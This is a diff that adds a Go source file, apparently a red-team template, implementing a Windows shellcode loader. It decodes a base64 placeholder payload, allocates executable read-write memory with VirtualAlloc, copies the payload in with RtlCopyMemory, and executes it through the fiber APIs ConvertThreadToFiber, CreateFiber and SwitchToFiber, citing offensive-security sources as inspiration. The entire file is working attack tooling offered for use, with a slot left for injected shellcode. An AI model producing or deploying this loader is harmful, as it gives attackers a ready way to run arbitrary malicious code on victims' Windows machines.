@@ -1,0 +1,87 @@
+// Inspired by ired.team and Ne0nd0g's go-shellcode repository
+// Reference: https://github.com/Ne0nd0g/go-shellcode
+// Reference: https://ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
+
+
+package main
+
+// import modules we'll need.  We will need unsafe and the windows libraries to be able to 
+// launch shellcode. The winddows library let's us use DLLs and unsafe bypasses go 
+// restrictions around casting so that we can execute code
+
+import (
+	"encoding/base64"
+	"fmt"
+	"unsafe"
+	"golang.org/x/sys/windows"
+)
+
+// Constants that we will need
+const (
+	_MEM_COMMIT = 0x1000
+	_MEM_RESERVE = 0x2000
+	_PAGE_RWX = 0x40
+)
+
+func main() {
+
+
+	// shellcode in base64 
+	sc := "INJECT"
+
+	shellcode, err := base64.StdEncoding.DecodeString(sc)
+	if err != nil {
+		fmt.Sprintf("Base64 Decoding Error: %s", err.Error())
+		return
+	}
+
+	// Load dlls
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+
+	// memory creation/copy routines
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+
+	// Fiber creation routines
+	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
+	CreateFiber := kernel32.NewProc("CreateFiber")
+	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
+
+	// Only fibers can scedule fibers, so this convers the main thread into a fiber
+	_, _, err = ConvertThreadToFiber.Call()
+
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Sprintf("ConvertThreadToFiber Failed: %s", err.Error())
+		return
+	}
+
+	// Create memory for our shellcode
+	addr, _, err:= VirtualAlloc.Call(0, uintptr(len(shellcode)), _MEM_COMMIT|_MEM_RESERVE, _PAGE_RWX)
+
+	if ((err != nil && err.Error() != "The operation completed successfully.") || addr == 0)  {
+		fmt.Sprintf("VirtualAlloc Failed:%s", err.Error())
+		return
+	}
+
+	// Copy shellcode to our newly created memory
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Sprintf("RtlCopyMemory Failed:%s", err.Error())
+		return
+	}
+
+	// Create Fiber to execute shellcode
+	fiber, _, err:= CreateFiber.Call(0, addr, 0)
+
+	if err!= nil && err.Error() != "The operation completed successfully." {
+		fmt.Sprintf("CreateFiber Failed:%s", err.Error())
+		return
+	}
+
+	// Switch to Fiber
+	SwitchToFiber.Call(fiber)
+
+
+}
